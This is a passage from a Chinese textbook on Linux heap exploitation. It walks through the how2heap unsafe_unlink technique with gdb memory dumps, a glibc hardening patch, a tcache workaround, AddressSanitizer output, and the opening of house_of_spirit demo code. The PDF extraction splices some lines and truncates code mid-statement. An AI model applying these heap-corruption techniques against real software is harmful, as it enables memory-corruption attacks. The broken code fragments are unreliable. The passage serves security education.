0x602020: 0x0000000000601058 0x0000000000601060 fd->bk == P ， P->bk->fd == P ，可以绕过检查。另外
利用 chunk0 的溢出漏洞，通过修改 chunk 1 的 prev_size 为 fake chunk 的大
小，修改 PREV_INUSE 标志位为 0，将 fake chunk 伪造成一个 free chunk。
接下来就是释放掉 chunk1，这会触发 fake chunk 的 unlink 并覆盖 chunk0_ptr
的值。unlink 操作是这样进行的：
FD = P->fd;
BK = P->bk;
FD->bk = BK
BK->fd = FD
根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：
FD = P->fd = &P - 24
BK = P->bk = &P - 16
FD->bk = *(&P - 24 + 24) = P
FD->fd = *(&P - 16 + 16) = P
这样就通过了 unlink 的检查，最终效果为：
FD->bk = P = BK = &P - 16
BK->fd = P = FD = &P - 24
原本指向堆上 fake chunk 的指针 P 指向了自身地址减 24 的位置，这就意味着如果
程序功能允许堆 P 进行写入，就能改写 P 指针自身的地址，从而造成任意内存写
入。若允许堆 P 进行读取，则会造成信息泄漏。
在这个例子中，由于 P->fd->bk 和 P->bk->fd 都指向 P，所以最后的结果为：
chunk0_ptr = P = P->fd
成功地修改了 chunk0_ptr，这时 chunk0_ptr 和 chunk0_ptr[3] 实际上就是
同一东西。这里可能会有疑惑为什么这两个东西是一样的，因为 chunk0_ptr 指
针在是放在数据段上的，地址在 0x601070 ，指向 0x601058 ，而
457
3.1.6 Linux 堆利用（一）
chunk0_ptr[3] 的意思是从 chunk0_ptr 指向的地方开始数 3 个单位，所以
0x601058+0x08*3=0x601070 ：
gef➤ x/40gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000091 prev->chunk_size 的检查，以对抗单字节溢出的问题。补丁如下：
459
3.1.6 Linux 堆利用（一）
$ git show 17f487b7afa7cd6c316040f3e6c86dc96b2eec30 malloc/mallo
c.c
commit 17f487b7afa7cd6c316040f3e6c86dc96b2eec30
Author: DJ Delorie 
Date: Fri Mar 17 15:31:38 2017 -0400
Further harden glibc malloc metadata against 1-byte overflow
s.
Additional check for chunk_size == next->prev->chunk_size in
unlink()
2017-03-17 Chris Evans 
* malloc/malloc.c (unlink): Add consistency check be
tween size and
next->prev->size, to further harden against 1-byte o
verflows.
diff --git a/malloc/malloc.c b/malloc/malloc.c
index e29105c372..994a23248e 100644
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -1376,6 +1376,8 @@ typedef struct malloc_chunk *mbinptr;
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {
\
+ if (__builtin_expect (chunksize(P) != prev_size (next_chunk
(P)), 0)) \
+ malloc_printerr (check_action, "corrupted size vs. prev_s
ize", P, AV); \
FD = P->fd;
\
BK = P->bk;
\
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
\
460
3.1.6 Linux 堆利用（一）
具体是这样的：
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (
p)))
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))
/* Like chunksize, but do not mask SIZE_BITS. */
#define chunksize_nomask(p) ((p)->mchunk_size)
/* Size of the chunk below P. Only valid if prev_inuse (P). */
#define prev_size(p) ((p)->mchunk_prev_size)
/* Bits to mask off when extracting size */
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
回顾一下伪造出来的堆：
461
3.1.6 Linux 堆利用（一）
gef➤ x/40gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000091 fd 。为了解决这个问题，一种可能的办法是给
填充进特定大小的 chunk 把 bin 占满，就像下面这样：
// deal with tcache
int *a[10];
int i;
for (i = 0; i 
gef➤ x/gx 0x555555755070
0x555555755070 : 0x00007fffffffdd0f
gef➤ x/gx 0x00007fffffffdd0f
0x7fffffffdd0f: 0x4242424242424242
现在 libc-2.26 版本下也成功利用了。tcache 是个很有趣的东西，更详细的内容我
们会在专门的章节里去讲。
加上内存检测参数重新编译，可以看到 heap-buffer-overflow：
463
3.1.6 Linux 堆利用（一）
$ gcc -fsanitize=address -g unsafe_unlink.c
$ ./a.out
The global chunk0_ptr is at 0x602230, pointing to 0x60c00000bf80
The victim chunk we are going to corrupt is at 0x60c00000bec0
Fake chunk fd: 0x602218
Fake chunk bk: 0x602220
================================================================
=
==5591==ERROR: AddressSanitizer: heap-buffer-overflow on address
0x60c00000beb0 at pc 0x000000400d74 bp 0x7ffd06423730 sp 0x7ffd
06423720
WRITE of size 8 at 0x60c00000beb0 thread T0
#0 0x400d73 in main /home/firmy/how2heap/unsafe_unlink.c:26
#1 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gn
u/libc.so.6+0x2082f)
#2 0x400968 in _start (/home/firmy/how2heap/a.out+0x400968)
0x60c00000beb0 is located 16 bytes to the left of 128-byte regio
n [0x60c00000bec0,0x60c00000bf40)
allocated by thread T0 here:
#0 0x7fc9261c4602 in malloc (/usr/lib/x86_64-linux-gnu/libas
an.so.2+0x98602)
#1 0x400b12 in main /home/firmy/how2heap/unsafe_unlink.c:13
#2 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gn
u/libc.so.6+0x2082f)
house_of_spirit
464
3.1.6 Linux 堆利用（一）
#include 
#include 
int main() {
malloc(1);
fprintf(stderr, "We will overwrite a pointer to point to a f
ake 'fastbin' region. This region contains two chunks.\n");
unsigned long long *a, *b;
unsigned long long fake_chunks[10] __attribute__ ((aligned (
16)));
fprintf(stderr, "The first one: %p\n", &fake_chunks[0]);
fprintf(stderr, "The second one: %p\n", &fake_chunks[4]);
fake_chunks[1] = 0x20; // the size
fake_chunks[5] = 0x1234; // nextsize
fake_chunks[2] = 0x4141414141414141LL;
fake_chunks[6] = 0x4141414141414141LL;
fprintf(stderr, "Overwritting our pointer with the address o
f the fake region inside the fake first chunk, %p.\n", &fake_chu
nks[0]);
a = &fake_chunks[2];
fprintf(stderr, "Freeing the overwritten pointer.\n");
free(a);
fprintf(stderr, "Now the next malloc will return the region
of our fake chunk at %p, which will be %p!\n", &fake_chunks[0],
&fake_chunks[2]);
b = malloc(0x10);